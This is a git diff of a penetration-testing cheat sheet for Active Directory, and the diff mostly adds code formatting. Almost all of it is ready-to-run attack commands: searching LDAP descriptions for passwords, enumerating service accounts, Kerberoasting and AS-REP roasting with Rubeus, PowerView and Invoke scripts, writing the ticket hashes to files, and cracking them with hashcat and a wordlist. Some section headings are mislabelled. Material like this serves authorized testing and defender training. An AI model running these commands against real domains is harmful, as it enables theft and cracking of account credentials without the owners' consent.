@@ -1,6 +1,7 @@
 # 1. Sensitive Data in LDAP
 ## Start ADExplorer and search through the AD for sensitive information
 `PS> adexplorer.exe`
+
 ADexplorer> search user description field contains pw, pwd, password, pass
 
 ## Enumerate the AD with ADRecon
@@ -58,58 +59,58 @@ ToDo error
 `PS> Get-NetUser -SPN | ft serviceprincipalname, samaccountname, cn, pwdlastset`
 
 ### PowerView-Dev
-PS> Import-Module .\PowerView-dev.ps1
+`PS> Import-Module .\PowerView-dev.ps1`
 
-PS> Get-DomainUser | Where-Object {$_.servicePrincipalName} | fl
+`PS> Get-DomainUser | Where-Object {$_.servicePrincipalName} | fl`
 
-PS> Get-DomainUser -SPN | ft serviceprincipalname, samaccountname, cn, pwdlastset 
+`PS> Get-DomainUser -SPN | ft serviceprincipalname, samaccountname, cn, pwdlastset`
 
 ### Invoke-Kerberoast
-PS> Import-Module .\Invoke-Kerberoast.ps1
+`PS> Import-Module .\Invoke-Kerberoast.ps1`
 
-PS> Invoke-Kerberoast
+`PS> Invoke-Kerberoast`
 
 ### Rubeus
-PS> .\Rubeus.exe kerberoast
+`PS> .\Rubeus.exe kerberoast`
 
 ## Get TGS Kerberos Tickets
 ### PowerView-Dev
-PS> Import-Module .\PowerView-dev.ps1
+`PS> Import-Module .\PowerView-dev.ps1`
 
-Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | % { $_.Hash } | Out-File -Encoding ASCII kerberoasted.txt
+`Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | % { $_.Hash } | Out-File -Encoding ASCII kerberoasted.txt`
 
 ### Invoke-Kerberoast
-PS> Import-Module .\Invoke-Kerberoast.ps1
+`PS> Import-Module .\Invoke-Kerberoast.ps1`
 
-PS> Invoke-Kerberoast | % { $_.Hash } | Out-File -Encoding ASCII kerberoasted.txt
+`PS> Invoke-Kerberoast | % { $_.Hash } | Out-File -Encoding ASCII kerberoasted.txt`
 
 ### Rubeus
-PS> .\Rubeus.exe kerberoast /outfile:kerberoasted.txt
+`PS> .\Rubeus.exe kerberoast /outfile:kerberoasted.txt`
 
 ## Crack TGS tickets
-PS> hashcat -a 0 -m 13100 kerberoasted.txt /usr/share/wordlists/rockyou.txt
+`PS> hashcat -a 0 -m 13100 kerberoasted.txt /usr/share/wordlists/rockyou.txt`
 
 # 3. Kerberoasting
 ## Identify AS-REP roastable users
 ### PowerView-Dev
-PS> Get-DomainUser -PreauthNotRequired | ft samaccountname, pwdlastset 
+`PS> Get-DomainUser -PreauthNotRequired | ft samaccountname, pwdlastset`
 
-PS> Get-DomainUser -UACFilter DONT_REQ_PREAUTH,NOT_PASSWORD_EXPIRED | ft samaccountname, pwdlastset
+`PS> Get-DomainUser -UACFilter DONT_REQ_PREAUTH,NOT_PASSWORD_EXPIRED | ft samaccountname, pwdlastset`
 
 ### Rubeus
-PS> .\Rubeus.exe asreproast
+`PS> .\Rubeus.exe asreproast`
 
 ### Invoke-ASREPRoast
-PS> Import-Module .\Invoke-ASREPRoast.ps1
+`PS> Import-Module .\Invoke-ASREPRoast.ps1`
 
-PS> Invoke-ASREPRoast
+`PS> Invoke-ASREPRoast`
 
 ## ASREPRoasting
 ### Rubeus
-PS> .\Rubeus.exe asreproast /format:hashcat /outfile:asrephashes.txt
+`PS> .\Rubeus.exe asreproast /format:hashcat /outfile:asrephashes.txt`
 
 ### Invoke-ASREPRoast
-PS> Invoke-ASREPRoast | % { $_.Hash } | Out-File -Encoding ASCII asrephashes.txt
+`PS> Invoke-ASREPRoast | % { $_.Hash } | Out-File -Encoding ASCII asrephashes.txt`
 
 ## Cracking AS-REP hash with Hashcat
-PS> hashcat -a 0 -m 18200 asrephashes.txt /usr/share/wordlists/rockyou.txt
+`PS> hashcat -a 0 -m 18200 asrephashes.txt /usr/share/wordlists/rockyou.txt`
